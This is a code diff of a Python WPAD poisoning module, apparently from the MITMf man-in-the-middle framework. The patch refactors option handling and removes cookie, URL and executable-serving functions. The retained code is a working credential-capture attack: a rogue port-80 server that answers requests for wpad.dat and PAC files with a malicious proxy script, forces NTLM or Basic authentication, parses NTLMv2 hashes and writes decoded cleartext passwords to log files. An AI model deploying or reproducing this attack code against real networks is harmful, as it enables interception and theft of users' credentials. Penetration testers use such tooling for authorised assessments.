@@ -1,16 +1,23 @@
 import socket
 import threading
 import logging
+import re
 
 from SocketServer import TCPServer, ThreadingMixIn, BaseRequestHandler
 from core.configwatcher import ConfigWatcher
+from core.responder.common import *
 from HTTPPackets import *
 
 mitmf_logger = logging.getLogger("mitmf")
 
 class WPADPoisoner():
 
-	def start(self):
+	def start(self, options):
+
+		global args; args = options
+		args.forceWpadAuth = False
+		args.basic = False
+
 		try:
 			mitmf_logger.debug("[WPADPoisoner] online")
 			server = ThreadingTCPServer(("0.0.0.0", 80), HTTP)
@@ -36,17 +43,14 @@ class HTTP(BaseRequestHandler):
 				self.request.settimeout(1)
 				data = self.request.recv(8092)
 				buff = WpadCustom(data,self.client_address[0])
-				if buff and WpadForcedAuth(Force_WPAD_Auth) == False:
-					Message = "[+]WPAD (no auth) file sent to: %s"%(self.client_address[0])
-					if Verbose:
-						print Message
-					mitmf_logger.info(Message)
+				if buff and args.forceWpadAuth is False:
+					mitmf_logger.info("[WPADPoisoner] WPAD (no auth) file sent to: {}".format(self.client_address[0]))
 					self.request.send(buff)
 				else:
 					buffer0 = PacketSequence(data,self.client_address[0])
 					self.request.send(buffer0)
-		except Exception:
-			pass#No need to be verbose..
+		except Exception as e:
+			pass
 
 #Parse NTLMv1/v2 hash.
 def ParseHTTPHash(data,client):
@@ -92,30 +96,14 @@ def ParseHTTPHash(data,client):
 		mitmf_logger.info('[+]HTTP NTLMv2 Hostname is :%s'%(HostName))
 		mitmf_logger.info('[+]HTTP NTLMv2 Complete hash is :%s'%(WriteHash))
 
-def GrabCookie(data,host):
-	Cookie = re.search('(Cookie:*.\=*)[^\r\n]*', data)
-	if Cookie:
-		CookieStr = "[+]HTTP Cookie Header sent from: %s The Cookie is: \n%s"%(host,Cookie.group(0))
-		mitmf_logger.info(CookieStr)
-		return Cookie.group(0)
-	else:
-		NoCookies = "No cookies were sent with this request"
-		mitmf_logger.info(NoCookies)
-		return NoCookies
-
 def WpadCustom(data,client):
+	WPAD_Script = ConfigWatcher.getInstance().getConfig()["Responder"]['WPADScript']
 	Wpad = re.search('(/wpad.dat|/*\.pac)', data)
 	if Wpad:
 		buffer1 = WPADScript(Payload=WPAD_Script)
 		buffer1.calculate()
 		return str(buffer1)
 	else:
-		return False
-
-def WpadForcedAuth(Force_WPAD_Auth):
-	if Force_WPAD_Auth == True:
-		return True
-	if Force_WPAD_Auth == False:
 		return False
 
 # Function used to check if we answer with a Basic or NTLM auth.
@@ -125,77 +113,14 @@ def Basic_Ntlm(Basic):
 	else:
 		return IIS_Auth_401_Ans()
 
-def ServeEXE(data,client, Filename):
-	Message = "[+]Sent %s file sent to: %s."%(Filename,client)
-	mitmf_logger.info(Message)
-	with open (Filename, "rb") as bk:
-		data = bk.read()
-		bk.close()
-		return data
-
-def ServeEXEOrNot(on_off):
-	if Exe_On_Off == "ON":
-		return True
-	if Exe_On_Off == "OFF":
-		return False
-
-def ServeEXECAlwaysOrNot(on_off):
-	if Exec_Mode_On_Off == "ON":
-		return True
-	if Exec_Mode_On_Off == "OFF":
-		return False
-
-def IsExecutable(Filename):
-	exe = re.findall('.exe',Filename)
-	if exe:
-		return True
-	else:
-		return False
-
-def GrabURL(data, host):
-	GET = re.findall('(?<=GET )[^HTTP]*', data)
-	POST = re.findall('(?<=POST )[^HTTP]*', data)
-	POSTDATA = re.findall('(?<=\r\n\r\n)[^*]*', data)
-	if GET:
-		HostStr = "[+]HTTP GET request from : %s. The HTTP URL requested was: %s"%(host, ''.join(GET))
-		mitmf_logger.info(HostStr)
-		#print HostStr
-
-	if POST:
-		Host3Str = "[+]HTTP POST request from : %s. The HTTP URL requested was: %s"%(host,''.join(POST))
-		mitmf_logger.info(Host3Str)
-		#print Host3Str
-		if len(''.join(POSTDATA)) >2:
-			PostData = '[+]The HTTP POST DATA in this request was: %s'%(''.join(POSTDATA).strip())
-			#print PostData
-			mitmf_logger.info(PostData)
-
 #Handle HTTP packet sequence.
 def PacketSequence(data,client):
 	Ntlm = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
 	BasicAuth = re.findall('(?<=Authorization: Basic )[^\\r]*', data)
 
-	if ServeEXEOrNot(Exe_On_Off) and re.findall('.exe', data):
-		File = config.get('HTTP Server', 'ExecFilename')
-		buffer1 = ServerExeFile(Payload = ServeEXE(data,client,File),filename=File)
-		buffer1.calculate()
-		return str(buffer1)
-
-	if ServeEXECAlwaysOrNot(Exec_Mode_On_Off):
-		if IsExecutable(FILENAME):
-			buffer1 = ServeAlwaysExeFile(Payload = ServeEXE(data,client,FILENAME),ContentDiFile=FILENAME)
-			buffer1.calculate()
-			return str(buffer1)
-		else:
-			buffer1 = ServeAlwaysNormalFile(Payload = ServeEXE(data,client,FILENAME))
-			buffer1.calculate()
-			return str(buffer1)
-
 	if Ntlm:
 		packetNtlm = b64decode(''.join(Ntlm))[8:9]
 		if packetNtlm == "\x01":
-			GrabURL(data,client)
-			GrabCookie(data,client)
 			r = NTLM_Challenge(ServerChallenge=Challenge)
 			r.calculate()
 			t = IIS_NTLM_Challenge_Ans()
@@ -205,11 +130,8 @@ def PacketSequence(data,client):
 		if packetNtlm == "\x03":
 			NTLM_Auth= b64decode(''.join(Ntlm))
 			ParseHTTPHash(NTLM_Auth,client)
-			if WpadForcedAuth(Force_WPAD_Auth) and WpadCustom(data,client):
-				Message = "[+]WPAD (auth) file sent to: %s"%(client)
-				if Verbose:
-					print Message
-				mitmf_logger.info(Message)
+			if args.forceWpadAuth and WpadCustom(data,client):
+				mitmf_logger.info("[WPADPoisoner] WPAD (auth) file sent to: {}".format(client))
 				buffer1 = WpadCustom(data,client)
 				return buffer1
 			else:
@@ -218,16 +140,11 @@ def PacketSequence(data,client):
 				return str(buffer1)
 
 	if BasicAuth:
-		GrabCookie(data,client)
-		GrabURL(data,client)
 		outfile = "./logs/responder/HTTP-Clear-Text-Password-"+client+".txt"
 		WriteData(outfile,b64decode(''.join(BasicAuth)), b64decode(''.join(BasicAuth)))
 		mitmf_logger.info('[+]HTTP-User & Password: %s'%(b64decode(''.join(BasicAuth))))
-		if WpadForcedAuth(Force_WPAD_Auth) and WpadCustom(data,client):
-			Message = "[+]WPAD (auth) file sent to: %s"%(client)
-			if Verbose:
-				print Message
-			mitmf_logger.info(Message)
+		if args.forceWpadAuth and WpadCustom(data,client):
+			mitmf_logger.info("[WPADPoisoner] WPAD (auth) file sent to: {}".format(client))
 			buffer1 = WpadCustom(data,client)
 			return buffer1
 		else:
@@ -236,5 +153,5 @@ def PacketSequence(data,client):
 			return str(buffer1)
 
 	else:
-		return str(Basic_Ntlm(Basic))
+		return str(Basic_Ntlm(args.basic))
 			
